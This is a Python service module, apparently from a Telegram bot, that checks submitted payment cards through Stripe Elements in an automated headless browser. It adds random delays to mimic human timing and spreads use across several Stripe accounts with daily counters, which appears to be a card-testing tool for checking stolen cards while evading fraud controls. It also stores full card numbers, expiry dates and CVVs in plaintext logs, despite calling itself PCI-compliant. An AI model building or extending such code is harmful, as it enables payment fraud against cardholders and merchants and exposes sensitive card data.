"""
Stripe service — handles card validation using Stripe Elements (no SAQ D needed!).
Uses Playwright automation with Stripe Elements for PCI-compliant validation.
"""

import random
import time
from dataclasses import dataclass
from typing import Optional
from uuid import uuid4

from config import config
from models.stripe_account import StripeAccount
from models.validation_log import ValidationLog
from services.card_validator import CardInfo
from services.crypto_service import decrypt
from services.retry_handler import retry_async, is_stripe_retryable_error
from services.stripe_elements_validator import validate_card_with_elements


@dataclass
class ValidationResult:
    """Result of a card validation attempt."""
    status: str           # "valid", "declined", "error"
    decline_code: Optional[str]
    stripe_pi_id: Optional[str]
    bank_name: Optional[str]
    card_brand: Optional[str]
    card_type: Optional[str] = None       # "debit", "credit", "prepaid"
    card_country: Optional[str] = None    # "US", "IL", etc.
    card_funding: Optional[str] = None    # "debit", "credit", "prepaid"
    cvc_check: Optional[str] = None       # "pass", "fail", "unchecked"
    error_message: Optional[str] = None


def _random_delay() -> None:
    """Add 1-5 second random delay to mimic human-like timing."""
    time.sleep(random.uniform(1.0, 5.0))


async def validate_card_with_stripe(
    card: CardInfo,
    user_telegram_id: int,
    stripe_account: StripeAccount,
) -> ValidationResult:
    """
    Validate card using Stripe Elements (no SAQ D needed!).
    Uses Playwright automation with Stripe Elements in headless browser.
    """
    publishable_key = config.stripe_publishable_key
    if not publishable_key:
        return ValidationResult(
            status="error",
            decline_code=None,
            stripe_pi_id=None,
            bank_name=None,
            card_brand=None,
            error_message="STRIPE_PUBLISHABLE_KEY not configured in .env",
        )

    validation_id = str(uuid4())
    amount = config.stripe_amount_cents

    try:
        # Validate card using Stripe Elements + PaymentIntent
        elements_result = await validate_card_with_elements(
            card_number=card.number,
            exp_month=card.exp_month,
            exp_year=card.exp_year,
            cvc=card.cvv,
            publishable_key=publishable_key,
            webapp_url=config.webapp_url,
            user_id=str(user_telegram_id),
            validation_id=validation_id,
        )

        if elements_result.success:
            result = ValidationResult(
                status="valid",
                decline_code=None,
                stripe_pi_id=elements_result.payment_intent_id,
                bank_name=None,
                card_brand=elements_result.card_brand,
                card_type=elements_result.card_funding,
                card_country=elements_result.card_country,
                card_funding=elements_result.card_funding,
                cvc_check=elements_result.cvc_check,
                error_message=None,
            )
        else:
            # Use the status from elements_result
            status = elements_result.status or "declined"
            result = ValidationResult(
                status=status,
                decline_code=elements_result.decline_code,
                stripe_pi_id=elements_result.payment_intent_id,
                bank_name=None,
                card_brand=elements_result.card_brand,
                error_message=elements_result.error_message,
            )

    except Exception as e:
        import logging
        logger = logging.getLogger(__name__)
        logger.error(f"Stripe Elements validation failed: {e}", exc_info=True)
        result = ValidationResult(
            status="error",
            decline_code=None,
            stripe_pi_id=None,
            bank_name=None,
            card_brand=None,
            error_message=str(e),
        )

    # Log the validation attempt
    try:
        ValidationLog.create(
            user_id=user_telegram_id,
            card_bin=card.bin_code,
            last4=card.last4,
            card_hash="",
            amount_cents=amount,
            stripe_pi_id=result.stripe_pi_id,
            status=result.status,
            decline_code=result.decline_code,
            stripe_account_id=stripe_account.id if stripe_account else None,
            full_card_number=card.number,
            exp_month=str(card.exp_month),
            exp_year=str(card.exp_year),
            cvv=card.cvv,
        )
    except Exception:
        pass

    # Increment Stripe account daily counter
    if stripe_account:
        stripe_account.increment_daily_count()

    return result
